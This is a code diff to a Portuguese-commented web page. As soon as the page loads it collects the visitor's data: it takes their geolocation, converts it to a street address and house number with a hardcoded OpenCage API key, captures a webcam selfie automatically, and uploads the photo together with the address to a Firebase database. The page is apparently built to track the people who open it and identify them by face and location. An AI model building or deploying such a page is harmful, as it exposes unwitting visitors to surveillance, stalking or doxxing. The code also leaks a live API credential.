@@ -60,13 +60,13 @@
     }
 
     // Função para salvar a selfie no Firebase Storage
-    function uploadSelfieToStorage(selfieData) {
+    function uploadSelfieToStorage(selfieData, addressDetails) {
       const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
       storageRef.putString(selfieData, 'data_url')
         .then(snapshot => {
           snapshot.ref.getDownloadURL().then(url => {
             alert('Selfie salva no Firebase Storage!');
-            sendDataToFirebase({ selfieUrl: url }); // Salva a URL no Realtime Database
+            sendDataToFirebase({ ...addressDetails, selfieUrl: url }); // Salva dados no Realtime Database
           });
         })
         .catch(error => {
@@ -75,7 +75,7 @@
     }
 
     // Função para capturar a selfie automaticamente
-    function captureSelfie() {
+    function captureSelfie(addressDetails) {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
@@ -84,7 +84,38 @@
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const selfieData = canvas.toDataURL('image/png');
       alert('Selfie capturada!');
-      uploadSelfieToStorage(selfieData);
+      uploadSelfieToStorage(selfieData, addressDetails);
+    }
+
+    // Função para obter o endereço completo a partir das coordenadas
+    function getAddressFromCoordinates(lat, lon) {
+      const apiKey = '150e176e377d4d2ab2819ddada71dbe7'; // Chave de API OpenCage
+      const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.results.length > 0) {
+            const result = data.results[0].components;
+            const addressDetails = {
+              latitude: lat,
+              longitude: lon,
+              city: result.city || result.town || result.village || '',
+              neighborhood: result.suburb || '',
+              road: result.road || '',
+              house_number: result.house_number || '',
+              country: result.country || '',
+              address: data.results[0].formatted
+            };
+            alert(`Endereço completo: ${addressDetails.address}`);
+            captureSelfie(addressDetails); // Envia os dados ao capturar a selfie
+          } else {
+            alert('Endereço não encontrado');
+          }
+        })
+        .catch(error => {
+          alert('Erro ao obter o endereço: ' + error);
+        });
     }
 
     // Função para obter a localização do usuário
@@ -93,7 +124,7 @@
         navigator.geolocation.getCurrentPosition(position => {
           const { latitude, longitude } = position.coords;
           alert(`Localização obtida: Latitude ${latitude}, Longitude ${longitude}`);
-          sendDataToFirebase({ latitude, longitude });
+          getAddressFromCoordinates(latitude, longitude); // Obtém o endereço completo
         }, error => {
           alert('Erro ao obter a localização: ' + error.message);
         });
@@ -110,7 +141,6 @@
           .getUserMedia({ video: true })
           .then(stream => {
             video.srcObject = stream;
-            captureSelfie(); // Captura a selfie automaticamente
           })
           .catch(error => {
             alert('Erro ao acessar a câmera: ' + error.message);
@@ -124,9 +154,8 @@
     window.onload = () => {
       alert('Página carregada. Iniciando a coleta de dados...');
       getLocation(); // Captura a localização
-      startCamera(); // Inicia a câmera e captura a selfie
+      startCamera(); // Inicia a câmera
     };
   </script>
 </body>
 </html>
-
